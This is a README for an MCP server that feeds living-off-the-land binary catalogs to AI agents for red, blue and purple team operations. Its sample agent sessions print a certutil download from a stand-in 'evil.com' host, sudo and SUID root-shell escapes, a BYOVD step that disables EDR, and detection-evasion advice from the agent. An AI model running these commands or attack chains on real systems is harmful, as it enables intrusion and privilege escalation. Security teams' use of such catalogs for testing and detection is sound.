<p align="center">
  <strong>English</strong> |
  <a href="README.zh.md">简体中文</a> |
  <a href="README.zh-TW.md">繁體中文</a> |
  <a href="README.ko.md">한국어</a> |
  <a href="README.de.md">Deutsch</a> |
  <a href="README.es.md">Español</a> |
  <a href="README.fr.md">Français</a> |
  <a href="README.it.md">Italiano</a> |
  <a href="README.da.md">Dansk</a> |
  <a href="README.ja.md">日本語</a> |
  <a href="README.pl.md">Polski</a> |
  <a href="README.ru.md">Русский</a> |
  <a href="README.bs.md">Bosanski</a> |
  <a href="README.ar.md">العربية</a> |
  <a href="README.no.md">Norsk</a> |
  <a href="README.pt-BR.md">Português (Brasil)</a> |
  <a href="README.th.md">ไทย</a> |
  <a href="README.tr.md">Türkçe</a> |
  <a href="README.uk.md">Українська</a> |
  <a href="README.bn.md">বাংলা</a> |
  <a href="README.el.md">Ελληνικά</a> |
  <a href="README.vi.md">Tiếng Việt</a> |
  <a href="README.hi.md">हिन्दी</a>
</p>

<p align="center">
  <br>
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/badchars/living-off-the-land-lolbins-mcp-server/main/.github/banner-dark.svg">
    <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/badchars/living-off-the-land-lolbins-mcp-server/main/.github/banner-light.svg">
    <img alt="living-off-the-land-lolbins-mcp-server" src="https://raw.githubusercontent.com/badchars/living-off-the-land-lolbins-mcp-server/main/.github/banner-dark.svg" width="700">
  </picture>
</p>

<h3 align="center">Living off the Land intelligence for AI agents.</h3>

<p align="center">
  GTFOBins, LOLBAS, LOOBins, LOLDrivers, LOLRMM, WADComs, LOLC2 and more &mdash; unified into a single MCP server.<br>
  Your AI agent gets <b>full-spectrum LOL binary intelligence</b> for red team, blue team, and purple team operations.
</p>

<br>

<p align="center">
  <a href="#the-problem">The Problem</a> &bull;
  <a href="#how-its-different">How It's Different</a> &bull;
  <a href="#quick-start">Quick Start</a> &bull;
  <a href="#what-the-ai-can-do">What The AI Can Do</a> &bull;
  <a href="#tools-reference-59-composite-tools">Tools (59)</a> &bull;
  <a href="#data-sources-10">Data Sources (10)</a> &bull;
  <a href="#architecture">Architecture</a> &bull;
  <a href="CHANGELOG.md">Changelog</a> &bull;
  <a href="CONTRIBUTING.md">Contributing</a>
</p>

<p align="center">
  <a href="https://www.npmjs.com/package/living-off-the-land-lolbins-mcp-server"><img src="https://img.shields.io/npm/v/living-off-the-land-lolbins-mcp-server.svg" alt="npm"></a>
  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License"></a>
  <img src="https://img.shields.io/badge/runtime-Bun-f472b6" alt="Bun">
  <img src="https://img.shields.io/badge/protocol-MCP-8b5cf6" alt="MCP">
  <img src="https://img.shields.io/badge/tools-59-ef4444" alt="59 Tools">
  <img src="https://img.shields.io/badge/sources-10-f97316" alt="10 Sources">
</p>

<p align="center">
  <img src="https://raw.githubusercontent.com/badchars/living-off-the-land-lolbins-mcp-server/main/.github/demo.gif" alt="living-off-the-land-lolbins-mcp-server demo" width="800">
</p>

---

## The Problem

Living off the Land binary intelligence is the missing layer in every red team engagement, purple team exercise, and detection engineering workflow. The binaries you need to abuse, detect, and defend against are documented across **10+ catalogs**, each with its own format, its own schema, its own platform focus:

```
Traditional LOL binary intel workflow:
  Linux privilege escalation         ->  GTFOBins web interface
  Windows LOL binaries               ->  LOLBAS project website
  macOS native binaries              ->  LOOBins web interface
  Vulnerable kernel drivers          ->  LOLDrivers project
  Abusable RMM tools                 ->  LOLRMM project
  VMware ESXi binaries               ->  LOLESXi project
  Living off trusted platforms       ->  LOTP project
  C2 over legitimate services        ->  LOLC2 project
  Firmware/BIOS/cabinet abuse        ->  LOFLCAB project
  Active Directory attacks           ->  WADComs web interface
  cross-platform correlation         ->  copy-paste into a spreadsheet
  ATT&CK mapping                     ->  manual lookup in Navigator
  detection rule writing             ->  start from scratch every time
  ────────────────────────────────────
  Total: hours per engagement, most of it switching contexts and reformatting data
```

**living-off-the-land-lolbins-mcp-server** gives your AI agent 59 composite tools (321 total tools) across 10 LOL catalogs via the [Model Context Protocol](https://modelcontextprotocol.io). The agent queries all catalogs in parallel, correlates binaries across platforms, discovers escalation paths, generates detection rules, and presents a unified attack/defense picture &mdash; in a single conversation.

```
With living-off-the-land-lolbins-mcp-server:
  You: "I need to escalate privileges on a Linux box with curl, python3, and find available"

  Agent: -> lol_lookup {binary: "curl", platform: "linux"}
         -> lol_lookup {binary: "python3", platform: "linux"}
         -> lol_lookup {binary: "find", platform: "linux"}
         -> lol_privesc_paths {binaries: ["curl","python3","find"], platform: "linux"}
         -> lol_detect_rules {binary: "find", technique: "suid"}
         -> "3 escalation paths found:
            1. find (SUID) — spawn shell via -exec: find . -exec /bin/sh -p \; -quit
            2. python3 (SUID) — python3 -c 'import os; os.execl("/bin/sh","sh","-p")'
            3. curl (sudo) — if sudo curl is allowed, file read via -o or write via -O
            MITRE ATT&CK: T1548.001 (Setuid/Setgid), T1059.006 (Python)
            Sigma rule generated for sysmon file creation + process exec patterns.
            Detection: monitor execve() calls from find/python3 with euid!=uid."
```

---

## How It's Different

Existing tools give you raw data one catalog at a time. living-off-the-land-lolbins-mcp-server gives your AI agent the ability to **reason across all LOL catalogs simultaneously** for attack planning, defense validation, and purple team exercises.

<table>
<thead>
<tr>
<th></th>
<th>Traditional Approach</th>
<th>living-off-the-land-lolbins-mcp-server</th>
</tr>
</thead>
<tbody>
<tr>
<td><b>Interface</b></td>
<td>10 different websites, wikis, and GitHub repos</td>
<td>MCP &mdash; AI agent calls tools conversationally</td>
</tr>
<tr>
<td><b>Data sources</b></td>
<td>One catalog at a time</td>
<td>10 catalogs queried in parallel</td>
</tr>
<tr>
<td><b>Cross-platform</b></td>
<td>Separate lookups for Linux, Windows, macOS, ESXi</td>
<td>Agent correlates: "curl exists on Linux (GTFOBins), Windows (LOLBAS), and macOS (LOOBins) with different abuse vectors on each"</td>
</tr>
<tr>
<td><b>Attack graphs</b></td>
<td>Manual whiteboard or spreadsheet</td>
<td>Agent builds attack graphs with BFS/DFS path finding from initial access to objective</td>
</tr>
<tr>
<td><b>Detection</b></td>
<td>Write Sigma/YARA rules from scratch</td>
<td>Agent generates Sigma, YARA, Sysmon, and EDR queries for any LOL binary abuse technique</td>
</tr>
<tr>
<td><b>ATT&CK mapping</b></td>
<td>Manual lookup in MITRE Navigator</td>
<td>Agent maps every technique to ATT&CK and exports Navigator layers</td>
</tr>
<tr>
<td><b>Purple team</b></td>
<td>Plan exercises manually</td>
<td>Agent generates purple team exercises with red team steps + blue team validation criteria</td>
</tr>
<tr>
<td><b>Setup</b></td>
<td>Bookmark 10 websites, learn 10 schemas</td>
<td><code>npx living-off-the-land-lolbins-mcp-server</code> &mdash; one command, zero config</td>
</tr>
</tbody>
</table>

---

## Quick Start

### Option 1: npx (no install)

```bash
npx living-off-the-land-lolbins-mcp-server
```

All tools work immediately. No API keys required &mdash; all 10 LOL catalogs are open-source data.

### Option 2: Clone

```bash
git clone https://github.com/badchars/living-off-the-land-lolbins-mcp-server.git
cd living-off-the-land-lolbins-mcp-server
bun install
```

### Connect to your AI agent

<details open>
<summary><b>Claude Code</b></summary>

```bash
# With npx
claude mcp add lolbins-mcp-server -- npx living-off-the-land-lolbins-mcp-server

# With local clone
claude mcp add lolbins-mcp-server -- bun run /path/to/living-off-the-land-lolbins-mcp-server/src/index.ts
```

</details>

<details>
<summary><b>Claude Desktop</b></summary>

Add to `~/Library/Application Support/Claude/claude_desktop_config.json`:

```json
{
  "mcpServers": {
    "lolbins": {
      "command": "npx",
      "args": ["-y", "living-off-the-land-lolbins-mcp-server"]
    }
  }
}
```

</details>

<details>
<summary><b>Cursor / Windsurf / other MCP clients</b></summary>

Same JSON config format. Point the command to `npx living-off-the-land-lolbins-mcp-server` or your local installation path.

</details>

### CLI Usage

```bash
# List composite tools (59)
npx living-off-the-land-lolbins-mcp-server --list

# List all tools including sub-tools (321)
npx living-off-the-land-lolbins-mcp-server --list-all

# Show help
npx living-off-the-land-lolbins-mcp-server --help

# Run any tool directly
npx living-off-the-land-lolbins-mcp-server --tool lol_lookup '{"binary":"curl","platform":"linux"}'
npx living-off-the-land-lolbins-mcp-server --tool lol_privesc_paths '{"binaries":["find","python3"],"platform":"linux"}'
npx living-off-the-land-lolbins-mcp-server --tool lol_detect_sigma '{"binary":"certutil.exe","technique":"download"}'
npx living-off-the-land-lolbins-mcp-server --tool lol_driver_check '{"driver":"RTCore64.sys"}'
```

### Start querying

```
You: "What LOL binaries on Windows can I use for lateral movement without dropping files to disk?"
```

That's it. The agent searches LOLBAS, correlates with ATT&CK, checks for detection coverage, and presents the full picture automatically.

---

## What The AI Can Do

### LOL Binary Lookup & Cross-Platform Correlation

```
You: "Look up certutil.exe across all platforms and catalogs"

Agent: -> lol_lookup {binary: "certutil.exe"}
       -> lol_cross_platform {binary: "certutil"}
       -> lol_attack_map {binary: "certutil.exe"}
       -> "certutil.exe — Windows LOL binary (LOLBAS):
          Functions: Download (ADS), Encode/Decode (Base64), Alternate Data Streams
          ATT&CK: T1140 (Deobfuscate), T1105 (Ingress Tool Transfer), T1564.004 (ADS)
          Commands:
            Download: certutil -urlcache -split -f http://evil.com/payload.exe out.exe
            Encode:   certutil -encode payload.exe encoded.txt
            Decode:   certutil -decode encoded.txt payload.exe
          Cross-platform equivalents:
            Linux: curl, wget, openssl (GTFOBins)
            macOS: curl, security (LOOBins)
          Detection: Sysmon EventID 1 (ProcessCreate) + EventID 11 (FileCreate)
          Sigma rule generated."
```

### Privilege Escalation Path Discovery

```
You: "I have sudo access to vim, tar, and zip on Linux. Find escalation paths."

Agent: -> lol_privesc_paths {binaries: ["vim","tar","zip"], platform: "linux"}
       -> lol_lookup {binary: "vim", platform: "linux"}
       -> lol_lookup {binary: "tar", platform: "linux"}
       -> lol_lookup {binary: "zip", platform: "linux"}
       -> "3 privilege escalation paths found:
          1. vim (sudo) — :!/bin/sh — drops to root shell immediately
          2. tar (sudo) — tar cf /dev/null testfile --checkpoint=1
             --checkpoint-action=exec=/bin/sh — shell via checkpoint
          3. zip (sudo) — zip /tmp/x.zip /etc/hosts -T
             -TT 'sh #' — shell via test command
          Risk: HIGH — all three provide immediate root shell
          MITRE: T1548.003 (Sudo and Sudo Caching)
          Remediation: restrict sudo to specific flags, use sudoers NOEXEC"
```

### Detection Engineering

```
You: "Generate detection rules for mshta.exe abuse"

Agent: -> lol_detect_sigma {binary: "mshta.exe", technique: "execute"}
       -> lol_detect_yara {binary: "mshta.exe"}
       -> lol_detect_sysmon {binary: "mshta.exe"}
       -> lol_detect_edr {binary: "mshta.exe"}
       -> "Detection package for mshta.exe (LOLBAS):
          Sigma: Process creation rule matching mshta.exe spawning
            cmd.exe/powershell.exe + network connection rule
          YARA: Rule matching mshta.exe loading VBScript/JScript payloads
          Sysmon: EventID 1 (child process) + EventID 3 (network)
            config snippet provided
          EDR (KQL): DeviceProcessEvents query for mshta.exe
            with suspicious command-line patterns
          Coverage: T1218.005 (Mshta), T1059.005 (VBScript)"
```

### Environment Enumeration & Attack Planning

```
You: "I'm on a Windows 10 box. Enumerate which LOL binaries are available and plan an attack chain."

Agent: -> lol_enum_environment {platform: "windows", version: "10"}
       -> lol_attack_graph {platform: "windows", objective: "persistence"}
       -> lol_opsec_check {techniques: ["certutil","mshta","schtasks"]}
       -> "Windows 10 LOL binary inventory:
          154 LOLBAS binaries available by default
          12 LOLDrivers vulnerable drivers known for Win10
          8 LOLRMM tools commonly present
          Attack chain (initial access -> persistence):
            1. mshta.exe — execute HTA payload (T1218.005)
            2. certutil.exe — download additional tools (T1105)
            3. schtasks.exe — establish persistence (T1053.005)
          OPSEC warnings:
            - certutil download triggers Defender ATP alert
            - mshta.exe flagged by most EDR products
            - schtasks.exe is heavily monitored
          Alternatives with lower detection:
            - Use desktopimgdownldr.dll for download instead of certutil
            - Use msiexec for execution instead of mshta"
```

### Purple Team Exercise Generation

```
You: "Create a purple team exercise around LOLDrivers and BYOVD"

Agent: -> lol_purple_exercise {topic: "BYOVD", catalogs: ["loldrivers"]}
       -> lol_driver_search {query: "kernel", vulnerable: true}
       -> lol_detect_rules {technique: "BYOVD"}
       -> "Purple Team Exercise: Bring Your Own Vulnerable Driver (BYOVD)
          Red Team Steps:
            1. Deploy RTCore64.sys (known vulnerable, CVE-2019-16098)
            2. Load driver via sc.exe create / sc.exe start
            3. Use driver to disable kernel callbacks (EDR bypass)
          Blue Team Validation:
            1. Verify driver load events (Sysmon EventID 6)
            2. Check driver signature against LOLDrivers blocklist
            3. Monitor for kernel callback removal
          Scoring: red success if EDR blind, blue success if detected in <5min
          MITRE: T1068 (Exploitation for Privilege Escalation)
          Caldera profile exported."
```

---

## Tools Reference (59 Composite Tools)

<details open>
<summary><b>Core (3) &mdash; Fundamental LOL binary lookup and search</b></summary>

| Tool | Description |
|------|-------------|
| `lol_lookup` | Look up a specific binary/tool across all 10 LOL catalogs &mdash; returns functions, commands, ATT&CK mapping, detection notes |
| `lol_search` | Full-text search across all catalogs by keyword, technique, or ATT&CK ID |
| `lol_list_catalogs` | List all available LOL catalogs with entry counts, last update time, and status |

</details>

<details>
<summary><b>Environment & Graph (4) &mdash; Host enumeration and attack graph reasoning</b></summary>

| Tool | Description |
|------|-------------|
| `lol_enum_environment` | Enumerate LOL binaries available on a target platform/version &mdash; returns full inventory of abusable binaries |
| `lol_attack_graph` | Build an attack graph from initial access to objective using available LOL binaries with BFS/DFS path finding |
| `lol_cross_platform` | Correlate a binary across Linux, Windows, macOS, and ESXi &mdash; shows equivalent abuse techniques per platform |
| `lol_dependency_map` | Map dependencies between LOL binaries &mdash; which binaries enable or chain into others |

</details>

<details>
<summary><b>Privilege Escalation (3) &mdash; Escalation path discovery and analysis</b></summary>

| Tool | Description |
|------|-------------|
| `lol_privesc_paths` | Discover privilege escalation paths given a list of available binaries and current access level |
| `lol_suid_audit` | Audit SUID/SGID binaries against GTFOBins for exploitable privilege escalation vectors |
| `lol_sudo_audit` | Audit sudoers entries against GTFOBins for escalation via sudo misconfigurations |

</details>

<details>
<summary><b>Persistence (2) &mdash; Persistence mechanism discovery</b></summary>

| Tool | Description |
|------|-------------|
| `lol_persist_techniques` | Enumerate persistence techniques achievable with available LOL binaries on the target platform |
| `lol_persist_detect` | Generate detection logic for LOL binary persistence mechanisms &mdash; registry keys, scheduled tasks, launch agents |

</details>

<details>
<summary><b>Lateral Movement (2) &mdash; Network propagation via LOL binaries</b></summary>

| Tool | Description |
|------|-------------|
| `lol_lateral_movement` | Find lateral movement techniques using LOL binaries &mdash; WMI, PsExec alternatives, SSH, RDP pivoting |
| `lol_fileless_lateral` | Discover fileless lateral movement options that leave minimal forensic artifacts |

</details>

<details>
<summary><b>Defense Evasion (5) &mdash; Evasion techniques and bypass methods</b></summary>

| Tool | Description |
|------|-------------|
| `lol_evasion_techniques` | Enumerate defense evasion techniques for a binary &mdash; AMSI bypass, ETW patching, log evasion |
| `lol_applocker_bypass` | Find AppLocker/WDAC bypass techniques using LOL binaries present on the system |
| `lol_amsi_bypass` | Discover AMSI bypass methods via LOL binaries and native Windows tools |
| `lol_log_evasion` | Find techniques to evade or tamper with logging using LOL binaries |
| `lol_edr_bypass` | Discover EDR bypass and blinding techniques using LOL binaries and vulnerable drivers |

</details>

<details>
<summary><b>Credential Access (2) &mdash; Credential harvesting via LOL binaries</b></summary>

| Tool | Description |
|------|-------------|
| `lol_credential_harvest` | Find credential dumping and harvesting techniques using LOL binaries &mdash; SAM, LSASS, keychain |
| `lol_credential_store` | Enumerate credential stores accessible via LOL binaries on the target platform |

</details>

<details>
<summary><b>Execution (3) &mdash; Code and command execution techniques</b></summary>

| Tool | Description |
|------|-------------|
| `lol_execute_techniques` | Enumerate all execution techniques for a binary &mdash; command execution, script hosting, DLL loading |
| `lol_execute_fileless` | Find fileless execution methods using LOL binaries &mdash; in-memory, reflective loading, living-off-the-land |
| `lol_execute_proxy` | Discover execution proxy techniques &mdash; binaries that can execute other binaries indirectly |

</details>

<details>
<summary><b>Discovery & Collection (2) &mdash; Reconnaissance and data gathering</b></summary>

| Tool | Description |
|------|-------------|
| `lol_discovery_techniques` | Find host and network discovery techniques using LOL binaries &mdash; enumeration, recon, fingerprinting |
| `lol_collection_techniques` | Enumerate data collection and staging techniques via LOL binaries |

</details>

<details>
<summary><b>Exfiltration & C2 (3) &mdash; Data exfiltration and command-and-control</b></summary>

| Tool | Description |
|------|-------------|
| `lol_exfiltration` | Find data exfiltration techniques using LOL binaries &mdash; DNS, HTTP, ICMP, alternate protocols |
| `lol_c2_channels` | Discover C2 channel options using legitimate services and LOL binaries (LOLC2 catalog) |
| `lol_c2_profile` | Generate C2 profiles using LOL binaries that blend with normal traffic patterns |

</details>

<details>
<summary><b>Payload & Obfuscation (4) &mdash; Payload generation and encoding</b></summary>

| Tool | Description |
|------|-------------|
| `lol_payload_generate` | Generate LOL binary abuse payloads for a given technique and platform |
| `lol_payload_encode` | Encode/obfuscate payloads using LOL binary capabilities &mdash; certutil, base64, compress |
| `lol_payload_deliver` | Find payload delivery methods using LOL binaries &mdash; download cradles, staged delivery |
| `lol_obfuscation` | Discover command obfuscation techniques for LOL binary abuse commands |

</details>

<details>
<summary><b>Drivers & RMM & CI/CD (3) &mdash; Vulnerable drivers, RMM tools, and firmware</b></summary>

| Tool | Description |
|------|-------------|
| `lol_driver_check` | Check a driver against the LOLDrivers database &mdash; known vulnerable, known malicious, CVEs, hashes |
| `lol_rmm_audit` | Audit installed RMM tools against LOLRMM catalog &mdash; identify abusable remote management software |
| `lol_firmware_abuse` | Search LOFLCAB catalog for firmware, BIOS, and cabinet file abuse techniques |

</details>

<details>
<summary><b>Platform Deep Dives (3) &mdash; Platform-specific analysis</b></summary>

| Tool | Description |
|------|-------------|
| `lol_gtfobins_deep` | Deep dive into GTFOBins for a Linux binary &mdash; all functions, shell escapes, file operations |
| `lol_lolbas_deep` | Deep dive into LOLBAS for a Windows binary &mdash; all functions, ATT&CK, detection, paths |
| `lol_esxi_deep` | Deep dive into LOLESXi for ESXi binary abuse &mdash; VM escape, hypervisor manipulation |

</details>

<details>
<summary><b>OPSEC & Planning (2) &mdash; Operational security and engagement planning</b></summary>

| Tool | Description |
|------|-------------|
| `lol_opsec_check` | Evaluate OPSEC risk for a set of LOL binary techniques &mdash; detection likelihood, EDR coverage, noise level |
| `lol_engagement_plan` | Generate a full engagement plan using LOL binaries for a given objective and constraints |

</details>

<details>
<summary><b>Threat Intelligence (3) &mdash; Adversary behavior and threat mapping</b></summary>

| Tool | Description |
|------|-------------|
| `lol_threat_actor_map` | Map LOL binary usage to known threat actors and APT groups |
| `lol_campaign_analysis` | Analyze a set of LOL techniques against known campaigns and intrusion sets |
| `lol_trending_techniques` | Get trending LOL binary abuse techniques from recent threat intelligence |

</details>

<details>
<summary><b>Forensics & IR (3) &mdash; Forensic analysis and incident response</b></summary>

| Tool | Description |
|------|-------------|
| `lol_forensic_artifacts` | Enumerate forensic artifacts left by LOL binary abuse &mdash; logs, registry, prefetch, shimcache |
| `lol_incident_timeline` | Correlate LOL binary execution events into an incident timeline |
| `lol_artifact_hunt` | Generate forensic hunting queries for LOL binary abuse artifacts across log sources |

</details>

<details>
<summary><b>Detection Engineering (4) &mdash; Rule generation and coverage analysis</b></summary>

| Tool | Description |
|------|-------------|
| `lol_detect_sigma` | Generate Sigma detection rules for LOL binary abuse techniques |
| `lol_detect_yara` | Generate YARA rules for identifying LOL binary abuse patterns in files and memory |
| `lol_detect_sysmon` | Generate Sysmon configuration entries for monitoring LOL binary activity |
| `lol_detect_edr` | Generate EDR queries (KQL, SPL, EQL) for LOL binary detection |

</details>

<details>
<summary><b>Blue Team Analytics (3) &mdash; Defensive posture assessment</b></summary>

| Tool | Description |
|------|-------------|
| `lol_coverage_gaps` | Analyze detection coverage gaps for LOL binary techniques in your environment |
| `lol_baseline_audit` | Audit LOL binary execution baselines to identify anomalous usage patterns |
| `lol_red_vs_blue_score` | Score red team techniques against blue team detection capabilities for LOL binaries |

</details>

<details>
<summary><b>AD & WADComs (1) &mdash; Active Directory attacks</b></summary>

| Tool | Description |
|------|-------------|
| `lol_wadcoms` | Search WADComs for Active Directory attack commands &mdash; Kerberoasting, DCSync, Pass-the-Hash, delegation abuse |

</details>

<details>
<summary><b>Reporting & Visualization (3) &mdash; Export and visualization</b></summary>

| Tool | Description |
|------|-------------|
| `lol_report_export` | Export findings as structured reports &mdash; JSON, Markdown, CSV formats |
| `lol_attack_navigator` | Export ATT&CK Navigator layer JSON for LOL binary technique coverage |
| `lol_visualize_graph` | Generate attack path visualizations &mdash; Mermaid diagrams, Graphviz DOT, ASCII art |

</details>

<details>
<summary><b>Integration Export (1) &mdash; Tool integration and automation</b></summary>

| Tool | Description |
|------|-------------|
| `lol_caldera_export` | Export LOL binary attack chains as MITRE Caldera adversary profiles for automated simulation |

</details>

---

## Data Sources (10)

| Catalog | Platform | Entries | Type | What it provides |
|---------|----------|---------|------|-----------------|
| [GTFOBins](https://gtfobins.github.io) | Linux/Unix | 400+ | Static/GitHub | Unix binaries exploitable for privilege escalation, file ops, shell escape, SUID abuse |
| [LOLBAS](https://lolbas-project.github.io) | Windows | 250+ | Static/GitHub | Windows LOL binaries, scripts, and libraries for execution, evasion, persistence |
| [LOOBins](https://www.loobins.io) | macOS | 50+ | Static/GitHub | macOS native binaries abusable for offensive operations |
| [LOLDrivers](https://www.loldrivers.io) | Windows (kernel) | 700+ | API/GitHub | Vulnerable and malicious kernel drivers for BYOVD attacks |
| [LOLRMM](https://lolrmm.io) | Cross-platform | 100+ | Static/GitHub | Legitimate RMM tools abused for persistence and remote access |
| [LOLESXi](https://lolesxi.com) | VMware ESXi | 30+ | Static/GitHub | ESXi binaries for VM escape, hypervisor manipulation, ransomware deployment |
| [LOTP](https://lotp.github.io) | Cross-platform | 40+ | Static/GitHub | Trusted platforms and services abused for malicious purposes |
| [LOLC2](https://lolc2.github.io) | Cross-platform | 30+ | Static/GitHub | Legitimate services abused as command-and-control channels |
| [LOFLCAB](https://loflcab.github.io) | Cross-platform | 20+ | Static/GitHub | Firmware, BIOS, and cabinet file abuse techniques |
| [WADComs](https://wadcoms.github.io) | Windows AD | 150+ | Static/GitHub | Active Directory attack commands and techniques |

---

## Architecture

```
src/
  index.ts                  # CLI entrypoint (--help, --list, --list-all, --tool, stdio server)
  protocol/
    mcp-server.ts           # MCP server setup (stdio transport)
    tools.ts                # Tool registry — all 59 composite tools + 321 total tools
  types/
    index.ts                # Shared types (ToolDef, ToolContext, ToolResult, CatalogEntry)
  schema/
    catalog.ts              # Unified catalog schema (Zod)
    technique.ts            # ATT&CK technique schema
    binary.ts               # Binary/tool schema
  utils/
    rate-limiter.ts         # Per-catalog rate limiter
    cache.ts                # TTL cache for catalog data
    loader.ts               # Catalog data loader (fetch + parse + normalize)
    updater.ts              # Catalog auto-updater (check for new entries)
  catalogs/
    gtfobins/               # GTFOBins parser and normalizer
    lolbas/                 # LOLBAS parser and normalizer
    loobins/                # LOOBins parser and normalizer
    loldrivers/             # LOLDrivers parser and normalizer
    lolrmm/                 # LOLRMM parser and normalizer
    lolesxi/                # LOLESXi parser and normalizer
    lotp/                   # LOTP parser and normalizer
    lolc2/                  # LOLC2 parser and normalizer
    loflcab/                # LOFLCAB parser and normalizer
    wadcoms/                # WADComs parser and normalizer
    index.ts                # Catalog registry and loader index
  knowledge-base/
    attack-map.ts           # MITRE ATT&CK mapping engine
    binary-db.ts            # Unified binary database (normalized from all catalogs)
    technique-db.ts         # Technique database with cross-references
  environment/
    enumerator.ts           # Platform environment enumeration
    platform-profiles.ts    # Default binary inventories per OS/version
  graph/
    attack-graph.ts         # Attack graph data structure
    pathfinder.ts           # BFS/DFS path finding algorithms
    visualizer.ts           # Mermaid, Graphviz, ASCII graph rendering
  providers/
    core/                   # Core lookup, search, list tools (3)
    environment/            # Environment & graph tools (4)
    privesc/                # Privilege escalation tools (3)
    persistence/            # Persistence tools (2)
    lateral/                # Lateral movement tools (2)
    evasion/                # Defense evasion tools (5)
    credential/             # Credential access tools (2)
    execution/              # Execution tools (3)
    discovery/              # Discovery & collection tools (2)
    exfiltration/           # Exfiltration & C2 tools (3)
    payload/                # Payload & obfuscation tools (4)
    drivers/                # Drivers, RMM, CI/CD tools (3)
    platform/               # Platform deep dive tools (3)
    opsec/                  # OPSEC & planning tools (2)
    threat-intel/           # Threat intelligence tools (3)
    forensics/              # Forensics & IR tools (3)
    detection/              # Detection engineering tools (4)
    blue-team/              # Blue team analytics tools (3)
    ad/                     # AD & WADComs tools (1)
    reporting/              # Reporting & visualization tools (3)
    integration/            # Integration export tools (1)
  composite/
    index.ts                # Composite tool orchestrator (chains sub-tools)
  scripts/
    update-catalogs.ts      # Script to fetch and update all catalog data
    build-knowledge-base.ts # Script to rebuild the unified knowledge base
```

**Design decisions:**

- **10 catalogs, 1 server** &mdash; Every LOL catalog is an independent module with its own parser and normalizer. The agent picks which catalogs to query based on the context.
- **Unified knowledge base** &mdash; All 10 catalogs are normalized into a common schema, enabling cross-platform correlation and attack graph reasoning.
- **Composite tools** &mdash; 59 composite tools orchestrate 321 underlying sub-tools, so the agent gets high-level capabilities without needing to chain dozens of calls.
- **Attack graph engine** &mdash; BFS/DFS path finding over the binary dependency graph enables automated escalation path discovery and attack chain generation.
- **Detection generation** &mdash; Sigma, YARA, Sysmon, and EDR query templates are built-in, not generated from scratch each time.
- **Zero API keys** &mdash; All 10 LOL catalogs are open-source data. No authentication required for any tool.
- **TTL caching** &mdash; Catalog data is cached locally with configurable TTL to avoid redundant fetches during multi-tool workflows.
- **Minimal dependencies** &mdash; `@modelcontextprotocol/sdk`, `zod`, and `cheerio`. All HTTP via native `fetch`.

---

## Requirements

- **Runtime:** Bun 1.3.9+ (recommended) or Node.js 22+
- **Platform:** macOS, Linux, Windows
- **Network:** Internet access for initial catalog fetch (subsequent queries use cache)

---

## Limitations

- Catalog data freshness depends on upstream project update frequency
- GTFOBins and LOLBAS have the most comprehensive entries; newer catalogs (LOFLCAB, LOLC2) have fewer
- Attack graph reasoning is heuristic-based &mdash; paths represent possibilities, not guaranteed exploitation
- Detection rules are templates that may need tuning for specific environments
- LOLDrivers vulnerability data covers known CVEs only &mdash; 0-day driver vulnerabilities not included
- WADComs requires Active Directory context for meaningful results
- macOS / Linux tested (Windows not tested)

---

## Part of the MCP Security Suite

| Project | Domain | Tools |
|---|---|---|
| [hackbrowser-mcp](https://github.com/badchars/hackbrowser-mcp) | Browser-based security testing | 39 tools, Firefox, injection testing |
| [cloud-audit-mcp](https://github.com/badchars/cloud-audit-mcp) | Cloud security (AWS/Azure/GCP) | 38 tools, 60+ checks |
| [github-security-mcp](https://github.com/badchars/github-security-mcp) | GitHub security posture | 39 tools, 45 checks |
| [cve-mcp](https://github.com/badchars/cve-mcp) | Vulnerability intelligence | 23 tools, 5 sources |
| [osint-mcp-server](https://github.com/badchars/osint-mcp-server) | OSINT & reconnaissance | 37 tools, 12 sources |
| [darknet-mcp-server](https://github.com/badchars/darknet-mcp-server) | Dark web & threat intelligence | 66 tools, 16 sources |
| **living-off-the-land-lolbins-mcp-server** | **LOL binary intelligence** | **59 composite tools, 10 catalogs** |

---

<p align="center">
<b>For authorized security testing and assessment only.</b><br>
Always ensure you have proper authorization before using LOL binary techniques on any target system.
</p>

<p align="center">
  <a href="LICENSE">MIT License</a> &bull; Built with Bun + TypeScript
</p>
